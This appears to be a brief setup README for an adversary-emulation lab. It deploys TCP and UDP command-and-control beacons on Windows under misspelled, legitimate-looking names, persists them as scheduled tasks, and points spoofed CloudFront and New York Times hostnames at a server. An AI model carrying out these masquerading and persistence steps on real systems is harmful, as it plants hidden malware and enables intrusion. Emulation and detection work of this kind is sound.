# Prerequisites
These require the following DNS records to be added:
- d111111abcdef8.cloudfront.net -> <some_existing_IP>
- server.newyorktimes.com -> <some_existing_IP>

# Placement
- Place `.exe` beacons as described in scheduled task scripts:
    - `TCPBeacon.exe` -> `C:\Program Files\mozzilla.exe`
    - `UDPBeacon.exe` -> `C:\Windows\accnt-service.exe`
- `.\registerTCP.ps1`
- `.\registerUDP.ps1`
- `Start-ScheduledTask -TaskName mozzilla` -> Start TCP beacon
- `Start-ScheduledTask -TaskName accnt-service` -> Start UDP beacon
